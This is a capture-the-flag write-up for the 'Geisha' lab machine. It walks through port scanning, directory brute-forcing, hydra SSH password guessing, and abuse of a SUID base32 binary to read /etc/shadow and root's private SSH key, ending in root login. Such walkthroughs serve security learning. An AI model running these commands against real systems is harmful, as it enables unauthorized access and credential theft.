# Geisha

## Nmap

```
sudo nmap 192.168.152.82 -p- -sS -sV                            

PORT     STATE    SERVICE       VERSION
21/tcp   open     ftp           vsftpd 3.0.3
22/tcp   open     ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open     http          Apache httpd 2.4.38 ((Debian))
7080/tcp open     ssl/empowerid LiteSpeed
7125/tcp open     http          nginx 1.17.10
8088/tcp open     http          LiteSpeed httpd
9198/tcp filtered unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

This one is a little bit tricky as we have multiple web servers which all appear to land us on the same page:

![](<../../../.gitbook/assets/image (1193).png>)

I put all the web server ports and addresses into a text file called list.txt and used `dirsearch.py` to run through each target.

```
python3 dirsearch.py -l list.txt  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 60 --full-url
```

After some time we get an interesting hit on port 7125.

![](<../../../.gitbook/assets/image (1194).png>)

I browsed to the URL and downloaded passwd.

![](<../../../.gitbook/assets/image (1195).png>)

From this we do know the user geisha exists on the system and can start to brute force the user. Running hydra against `SSH` we soon get a valid hit.

```
hydra -l geisha -P /usr/share/wordlists/rockyou.txt ssh://192.168.152.82
```

![](<../../../.gitbook/assets/image (1196).png>)

We now have `SSH` access as the user.

![](<../../../.gitbook/assets/image (1197) (1).png>)

As per usual I transferred over `linpeas` to the machine and after running we have identified the SUID bit being set on the base32 binary.

![](<../../../.gitbook/assets/image (1198).png>)

According to [GTFOBins ](https://gtfobins.github.io/gtfobins/base32/)we can take advantage of this to perform privileged file reads.

![](<../../../.gitbook/assets/image (1199).png>)

Initially I used this to read the /etc/shadow file. However, I was unable to crack the password with rockyou.txt.

![](<../../../.gitbook/assets/image (1201).png>)

Now we could use this to read the proof.txt flag but, we are not really done until we gain a root shell. I decided to have a stab at the root account having a id\_rsa key.

```
/usr/bin/base32 /root/.ssh/id_rsa | base32 --decode
```

![](<../../../.gitbook/assets/image (1202).png>)

I then transferred the key over to my attacking machine and used `chmod` to set appropriate permissions.

```
chmod 600 id_rsa
```

Then used the id\_rsa key to connect in as root on SSH.

```
ssh -i id_rsa root@192.168.152.82 
```

![](<../../../.gitbook/assets/image (1203) (1).png>)
